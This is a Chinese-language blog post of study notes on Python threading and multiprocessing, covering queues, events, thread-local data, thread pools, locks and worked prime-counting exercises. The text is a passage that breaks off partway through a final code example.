<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading,time</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Producer</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, threadname</span>):</span><br><span class="line">        threading.Thread.__init__(self, name=threadname)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">            myQueue.put(i)</span><br><span class="line">            <span class="built_in">print</span>(self.name, <span class="string">&quot; put &quot;</span>, i, <span class="string">&#x27;to queue&#x27;</span>)</span><br><span class="line">        myQueue.put(<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Consumer</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, threadname</span>):</span><br><span class="line">        threading.Thread.__init__(self, name=threadname)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line">            item = myQueue.get()</span><br><span class="line">            <span class="keyword">if</span> item == <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(self.name, <span class="string">&quot; get &quot;</span>, item, <span class="string">&#x27; from queue&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">myQueue = queue.Queue()</span><br><span class="line"></span><br><span class="line">p = Producer(<span class="string">&quot;producer&quot;</span>)</span><br><span class="line">c = Consumer(<span class="string">&quot;consumer&quot;</span>)</span><br><span class="line">c.start()</span><br><span class="line">p.start()</span><br><span class="line">c.join()</span><br><span class="line">p.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>结果:</strong><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649503198068.png"></p>
<p><strong>具体介绍：</strong><br>1、queue就是生成一个共享的队列，各个线程可以向这个队列里取元素也可以放元素。<br>2、可以在线程中使用<code>while True死循环</code>保证线程的执行，而后通过<code>if ...  break</code>的方法结束线程</p>
<blockquote>
<p>join方法的具体介绍</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649503754530.png"></p>
<blockquote>
<p>整体流程：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649503635177.png"></p>
<h2 id="Event实现线程通信"><a href="#Event实现线程通信" class="headerlink" title="Event实现线程通信"></a>Event实现线程通信</h2><blockquote>
<p>模块介绍</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649505431821.png"></p>
<blockquote>
<p>一个例子：模仿多线程连接服务器</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.DEBUG, <span class="built_in">format</span>=<span class="string">&#x27;(%(threadName)-10s) %(message)s&#x27;</span>,)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker</span>(<span class="params">event</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> event.is_set():</span><br><span class="line">        logging.debug(<span class="string">&#x27;Waiting for redis ready...&#x27;</span>)</span><br><span class="line">        event.wait()</span><br><span class="line">        logging.debug(<span class="string">&#x27;redis ready, and connect to redis server and do some work [%s]&#x27;</span>, time.ctime( ))</span><br><span class="line">    time. sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">readis_ready = threading.Event()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    t = threading.Thread( target=worker, args=(readis_ready,))</span><br><span class="line">    t.start()</span><br><span class="line">logging.debug(<span class="string">&#x27;first of all, check redis server, make sure it is 0K&#x27;</span>)</span><br><span class="line">time. sleep(<span class="number">3</span>)</span><br><span class="line">readis_ready.<span class="built_in">set</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>结果：</strong><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649505124497.png"></p>
<p><strong>具体介绍</strong>：<br>1、使用<code>readis_ready = threading.Event()</code>创建一个event.<br>2、在创建进程时将<code>event作为参数</code>传入<br>3、使用 <code>event.wait()</code>阻塞进程。<code>readis_ready.set()</code>解除阻塞。<br>4、此方法无锁。</p>
<p><strong>最后补充：</strong></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649505334998.png"><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649505320949.png"></p>
<h1 id="线程私有变量"><a href="#线程私有变量" class="headerlink" title="线程私有变量"></a>线程私有变量</h1><blockquote>
<p>思维导图：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649505514526.png"></p>
<blockquote>
<p>定义介绍：</p>
</blockquote>
<p>在多线程环境下，如果多个线程对全局变量进行了修改，将会影响到其他所有的线程。为了避免多个线程同时对变量进行修改，引入了线程同步机制，通过互斥锁、条件变量等来控制对全局变量的访问。</p>
<p>但是在很多时候线程也需要拥有自己的<strong>私有数据</strong>，可以使用局部变量方式，同时python还提供了<code>ThreadLocal变量</code>，它本身是一个全局变量， 但是每个线程却可以利用它来<strong>保存属于自己的私有数据</strong>，这些私有数据对其他线程也是不可见的.</p>
<blockquote>
<p>具体方法：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading , time</span><br><span class="line"><span class="comment">#创建全局ThreadLocal对象:</span></span><br><span class="line">local_data = threading.local()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            local_data.num += i</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            local_data.num = i</span><br><span class="line">        time. sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n%s local_data is : %s&#x27;</span> % (threading.current_thread().name, local_data.num) )</span><br><span class="line">threads=[]</span><br><span class="line">t1 = threading.Thread(target=fun, name=<span class="string">&#x27;Thread1&#x27;</span>, args=(<span class="number">5</span>, ))</span><br><span class="line">threads.append(t1)</span><br><span class="line">t2 = threading.Thread(target=fun, name=<span class="string">&#x27;Thread2&#x27;</span>, args=(<span class="number">5</span>,))</span><br><span class="line">threads.append(t2)</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.start()</span><br><span class="line">    t.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649506113491.png"></p>
<p>合理使用threading.local可以极大的简化代码逻辑，保证各个子线程的数据安全。</p>
<h1 id="ThreadPoolExecutor并发编程"><a href="#ThreadPoolExecutor并发编程" class="headerlink" title="ThreadPoolExecutor并发编程"></a>ThreadPoolExecutor并发编程</h1><blockquote>
<p>思维导图：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649506386440.png"></p>
<blockquote>
<p>定义引入：</p>
</blockquote>
<p>由于启动新线程时，涉及到和操作系统的交互，因此启动新线程的成本比较高，为了提高性能，可以使用线程池来管理线程。<br><strong>线程池</strong>在启动时创建大量的<strong>空闲线程</strong>，我们的程序只要将一个函数提交线程池， 线程池就会启动个空闲的线程来执行它。当函数结束后，这个线程并不会死亡，而是回到线程池中成为空闲状态，等待执行下一个函数。通过线程池可以控制系统中并发线程的数量。</p>
<p><strong>一般步骤:</strong><br>1、调用<code>ThreadPoolExecutor类</code>的构造函数创建一个线程池<br>2、定义普通函数作为线程任务<br>3、调用<code>ThreadPoolExecutor </code>对象的<code>submit()</code>方法提交线程池任务<br>4、通过<code>shutdown</code>方法关闭线程池</p>
<blockquote>
<p>具体使用：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading,time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="comment">#创建全局ThreadLocal对象:</span></span><br><span class="line">local_data = threading.local()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            local_data.num+= i</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            local_data.num = i</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n%s local_data is : %s&#x27;</span> % (threading.current_thread().name, local_data.num))</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">pool = ThreadPoolExecutor(max_workers=<span class="number">2</span>)</span><br><span class="line">task1 = pool.submit(fun, <span class="number">5</span>) <span class="comment">#提交1个任务</span></span><br><span class="line">task2 = pool.submit(fun, <span class="number">10</span>) <span class="comment">#提交1个任务</span></span><br><span class="line">time. sleep(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;task1:&quot;</span>, task1.done())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;task2:&quot;</span>, task2.done())</span><br><span class="line">pool.shutdown()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>结果：</strong><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649509811431.png"></p>
<p>注意点：<br>1、不需要再定义线程，而是通过线程池创建多个线程的集合。<br>2、通过submit向线程池里传递任务。</p>
<blockquote>
<p>使用with和map进行扩展：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading,time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="comment">#创建全局ThreadLocal对象:</span></span><br><span class="line">local_data = threading.local()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            local_data.num+= i</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            local_data.num = i</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n%s local_data is : %s&#x27;</span> % (threading.current_thread().name, local_data.num))</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">2</span>) <span class="keyword">as</span> pool:</span><br><span class="line">    task = pool.<span class="built_in">map</span>(fun, (<span class="number">5</span>,<span class="number">10</span>)) <span class="comment">#提交1个任务</span></span><br><span class="line"></span><br><span class="line">time. sleep(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> task:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>1、with可以用于管理池，不需要显式关闭<br>2、map同前。</p>
<h1 id="扩展积累"><a href="#扩展积累" class="headerlink" title="扩展积累"></a>扩展积累</h1><h2 id="实训作业"><a href="#实训作业" class="headerlink" title="实训作业"></a>实训作业</h2><blockquote>
<p>素数个数</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> cpu_count</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isPrime</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="comment"># 判断数字是否为素数</span></span><br><span class="line">    <span class="comment">#        请在此处添加代码       #</span></span><br><span class="line">    <span class="comment"># *************begin************#</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(math.sqrt(n)) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> n % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># **************end*************#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">howMany</span>(<span class="params">T</span>):</span><br><span class="line">    <span class="comment"># 计算给定区间含有多少个素数</span></span><br><span class="line">    <span class="comment">#        请在此处添加代码       #</span></span><br><span class="line">    <span class="comment"># *************begin************#</span></span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(T[<span class="number">0</span>], T[<span class="number">1</span>] + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> isPrime(i):</span><br><span class="line">            <span class="built_in">sum</span> += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line">    <span class="comment"># **************end*************#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">separateNum</span>(<span class="params">N, CPU_COUNT</span>):</span><br><span class="line">    <span class="comment"># 对整个数字空间N进行分段CPU_COUNT</span></span><br><span class="line">    <span class="comment">#        请在此处添加代码       #</span></span><br><span class="line">    <span class="comment"># *************begin************#</span></span><br><span class="line">    <span class="built_in">list</span> = [[i * (N // CPU_COUNT) + <span class="number">1</span>, (i + <span class="number">1</span>) * (N // CPU_COUNT)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, CPU_COUNT)]</span><br><span class="line">    <span class="built_in">list</span>[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">list</span>[CPU_COUNT - <span class="number">1</span>][<span class="number">1</span>] &lt; N:</span><br><span class="line">        <span class="built_in">list</span>[CPU_COUNT - <span class="number">1</span>][<span class="number">1</span>] = N</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># **************end*************#</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    N = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    <span class="comment"># 多进程</span></span><br><span class="line">    CPU_COUNT = cpu_count()  <span class="comment">##CPU内核数 本机为8</span></span><br><span class="line">    pool = Pool(CPU_COUNT)</span><br><span class="line">    sepList = separateNum(N, CPU_COUNT)</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(CPU_COUNT):</span><br><span class="line">        result.append(pool.apply_async(howMany, (sepList[i], )))</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    <span class="comment"># ans = 0</span></span><br><span class="line">    <span class="built_in">list</span> = [res.get() <span class="keyword">for</span> res <span class="keyword">in</span> result]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">sum</span>(<span class="built_in">list</span>), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>注意点</strong><br>1、判断素数的函数。<br>2、分区结果为区间的<strong>首尾</strong>，而不是全部。注意使用列表生成式。<br>3、<strong>进程池</strong>的使用，看函数与上介绍。（有返回值）</p>
<blockquote>
<p>多线程：合数</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">ans = <span class="number">0</span></span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isPrime</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="comment"># 判断数字是否为素数</span></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">global</span> ans</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(math.sqrt(n)) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> n % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">howMany</span>(<span class="params">T</span>):</span><br><span class="line">    <span class="comment"># 计算给定区间含有多少个素数</span></span><br><span class="line">  </span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(T[<span class="number">0</span>], T[<span class="number">1</span>] + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> isPrime(i):</span><br><span class="line">            <span class="built_in">sum</span> += <span class="number">1</span></span><br><span class="line">    lock.acquire()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">global</span> ans</span><br><span class="line">        ans += <span class="built_in">sum</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        lock.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">seprateNum</span>(<span class="params">N, CPU_COUNT</span>):</span><br><span class="line">    <span class="comment"># 对整个数字空间N进行分段CPU_COUNT</span></span><br><span class="line">    <span class="built_in">list</span> = [[i * (N // CPU_COUNT) + <span class="number">1</span>, (i + <span class="number">1</span>) * (N // CPU_COUNT)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, CPU_COUNT)]</span><br><span class="line">    <span class="built_in">list</span>[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">list</span>[CPU_COUNT - <span class="number">1</span>][<span class="number">1</span>] &lt; N:</span><br><span class="line">        <span class="built_in">list</span>[CPU_COUNT - <span class="number">1</span>][<span class="number">1</span>] = N</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    N = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    threadNum = <span class="number">32</span></span><br><span class="line"> <span class="comment">#        请在此处添加代码       #</span></span><br><span class="line">    <span class="comment"># *************begin************#</span></span><br><span class="line">    result = []</span><br><span class="line">    seqList = seprateNum(N, threadNum)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,threadNum):</span><br><span class="line">        result.append(threading.Thread(target=howMany,args=(seqList[i],)))</span><br><span class="line">        result[i].start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,threadNum):</span><br><span class="line">        result[i].join()</span><br><span class="line">    <span class="built_in">print</span>(N-<span class="number">1</span>-ans)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># **************end*************#</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>注意点：</strong><br>1、多线程的使用。（未使用线程池，而是多个线程，启动+join)<br>2、锁的使用，在更新ans时需要使用锁。</p>
<blockquote>
<p>锁的使用：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showfoo</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param n: 要输出foobarpython的次数</span></span><br><span class="line"><span class="string">    :return: 无返回，可直接输出</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 请在此处添加代码       #</span></span><br><span class="line">    <span class="comment"># *************begin************#</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        lockpython.acquire()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;foo&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        lockfoo.release()</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># **************end*************#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showbar</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      :param n: 要输出foobarpython的次数</span></span><br><span class="line"><span class="string">      :return: 无返回，可直接输出</span></span><br><span class="line"><span class="string">      &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 请在此处添加代码       #</span></span><br><span class="line">    <span class="comment"># *************begin************#</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        lockfoo.acquire()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;bar&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        lockbar.release()</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># **************end*************#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showpython</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      :param n: 要输出foobarpython的次数</span></span><br><span class="line"><span class="string">      :return: 无返回，可直接输出</span></span><br><span class="line"><span class="string">      &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 请在此处添加代码       #</span></span><br><span class="line">    <span class="comment"># *************begin************#</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        lockbar.acquire()  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;python&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        lockpython.release()</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># **************end*************#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    lockfoo = threading.Lock()  <span class="comment"># 定义3个互斥锁</span></span><br><span class="line">    lockbar = threading.Lock()</span><br><span class="line">    lockpython = threading.Lock()</span><br><span class="line">    n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    t1 = threading.Thread(target=showfoo, args=[n])  <span class="comment"># 定义3个线程</span></span><br><span class="line">    t2 = threading.Thread(target=showbar, args=[n])</span><br><span class="line">    t3 = threading.Thread(target=showpython, args=[n])</span><br><span class="line">    lockfoo.acquire()  <span class="comment"># 先锁住foo,bar锁，保证先打印foo</span></span><br><span class="line">    lockbar.acquire()</span><br><span class="line"></span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">    t3.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>注意点：</strong><br>1、锁会锁住临界资源，进程要使用这些资源必须先获取锁。<br>2、也可以使用锁来控制子线程的运行顺序。即在执行某代码之前，加上获取某个锁的条件，这样只有当这个锁解开之后才可以执行代码。<br>3、在主函数需要先获取foo、bar的锁，因为我们需要先输出foo，而要执行打印foo代码需要先获取python的锁。</p>
<h2 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h2><ol>
<li>基本单位</li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649512365647.png"></p>
<hr>
<ol start="2">
<li>误解进程</li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649512541681.png"></p>
<p> D :也可能是<strong>准备状态</strong>。<br> C :在单处理器系统中，如果发生死锁，进程就全部处于<strong>阻塞态</strong>；系统中没有进程时，也没有进程处于运行态。</p>
<hr>
<ol start="3">
<li>线程通信</li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649512750793.png"></p>
<p>D为进程通信</p>
<hr>
<ol start="4">
<li>易错点</li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649512795642.png"></p>
<hr>
<ol start="5">
<li>GIL锁</li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649512995463.png"></p>
<p><a href="https://blog.csdn.net/qq_45632139/article/details/106902316">https://blog.csdn.net/qq_45632139&#x2F;article&#x2F;details&#x2F;106902316</a></p>
<hr>
<ol start="6">
<li>死锁解法</li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649513120765.png"></p>
<hr>
<ol start="7">
<li>区分进程和线程</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process  </span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep  </span><br><span class="line">counter = <span class="number">0</span>  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_task</span>(<span class="params">string</span>) :  </span><br><span class="line">    <span class="keyword">global</span> counter  </span><br><span class="line">    <span class="keyword">while</span> counter &lt; <span class="number">5</span>:  </span><br><span class="line">        <span class="built_in">print</span>(string, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)  </span><br><span class="line">        counter += <span class="number">1</span>  </span><br><span class="line">        sleep(<span class="number">0.01</span>)  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():  </span><br><span class="line">    Process(target=sub_task, args=(<span class="string">&#x27;Ping&#x27;</span>,)).start()  </span><br><span class="line">    Process(target=sub_task, args=(<span class="string">&#x27;Pong&#x27;</span>,)).start()  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    main()  </span><br></pre></td></tr></table></figure>
<p>上代码是<strong>进程</strong>，各进程counter不会相互影响，只是顺序会有所不同，总数一致。<br>下代码是线程，会共享counter。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_task</span>(<span class="params">string</span>) :</span><br><span class="line">    <span class="keyword">global</span> counter</span><br><span class="line">    <span class="keyword">while</span> counter &lt; <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">print</span>(string, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">        counter += <span class="number">1</span></span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    p1 = threading.Thread(target=sub_task, args=(<span 